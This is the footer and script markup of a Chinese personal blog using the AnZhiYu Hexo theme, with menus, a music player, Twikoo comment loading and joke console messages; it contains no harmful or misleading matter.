href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">1</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="开关弹幕"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("06/10/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2025 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Onesword 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://onesword-twikoo-netlify.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://onesword-twikoo-netlify.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"><script async src="/js/anzhiyu/comment_barrage.js"></script></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://onesword-twikoo-netlify.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.39/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script async data-pjax src="/js/imgloaded.js?1"></script><script src="/custom/js/schedule.js"></script><script src="/custom/js/chineselunar.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script><script>//- 留言板页面弹幕
window.addEventListener('load', () => {
  const getnaokuo_danmu = () => {
    if (!window.location.pathname.startsWith('/comments/')) return; //- 判断是否是留言板页面
    const naokuo_danmu = async () => {
      const Danmaku = new EasyDanmaku({
        page: '/comments/', //- 即留言板地址
        el: '#danmu-wrap', //- 弹幕挂载节点
        line: 5, //- 弹幕行数
        speed: 20, //- 弹幕播放速度
        hover: true, //- 鼠标hover时是否暂停播放弹幕
        loop: false, //- 开启循环播放
        colourful: true, //- 开启彩色弹幕
        coefficient: 1.38, //- 弹幕密度系数
        runtime: 10, //- 循环弹幕播放时长
      });
      try {
        let danmuStore = saveToLocal.get('twikoo-danmu');
        if (!danmuStore) {
          const options = {
            method: "POST",
            body: JSON.stringify({
              "event": "GET_RECENT_COMMENTS",
              "includeReply": false,
              "pageSize": 100
            }),
            headers: { 'Content-Type': 'application/json' }
          }
          danmuStore = [];
          const response = await fetch(`https://onesword-twikoo-netlify.netlify.app/.netlify/functions/twikoo`, options);
          if (response.ok) {
            const { data } = await response.json();
            //- console.info(data);
            data.forEach(i => {
              if (i.avatar == undefined) i.avatar = 'https://cravatar.cn/avatar/d615d5793929e8c7d70eab5f00f7f5f1?d=mp'
              danmuStore.push({ avatar: i.avatar, content: i.nick + '：' + formatDanmaku(i.comment), url: i.url + '#' + i.id })
            });
            Danmaku.batchSend(danmuStore, true);
            saveToLocal.set('twikoo-danmu', danmuStore, 0.5)
          }
          //- 格式化评论
          function formatDanmaku(str) {
            str = str.replace(/<\/*br>|[\s\uFEFF\xA0]+/g, '');
            str = str.replace(/<img.*?>/g, '[图片]');
            str = str.replace(/<a.*?>.*?<\/a>/g, '[链接]');
            str = str.replace(/<pre.*?>.*?<\/pre>/g, '[代码块]');
            str = str.replace(/<.*?>/g, '');
            return str
          }
        } else {
          Danmaku.batchSend(danmuStore, true);
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }

      document.getElementById('danmu-Btn') && (document.getElementById('danmu-Btn').innerHTML = `<button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.remove('hide-danmu')">显示弹幕</button> <button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.add('hide-danmu')">隐藏弹幕</button>`)
    }
    (async () => {
      if (typeof EasyDanmaku === 'function') {
        await naokuo_danmu();
      } else {
        const easyDanmakuScript = await getScript('https://npm.onmicrosoft.cn/naokuo-blog@1.2.12/js/easy-Danmaku.js');
        if (typeof EasyDanmaku === 'function') {
          await naokuo_danmu();
        } else {
          console.error('EasyDanmaku function not found even after loading the script.');
        }
      }
    })();
  }
  getnaokuo_danmu()
  document.addEventListener('pjax:complete', getnaokuo_danmu)
})</script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>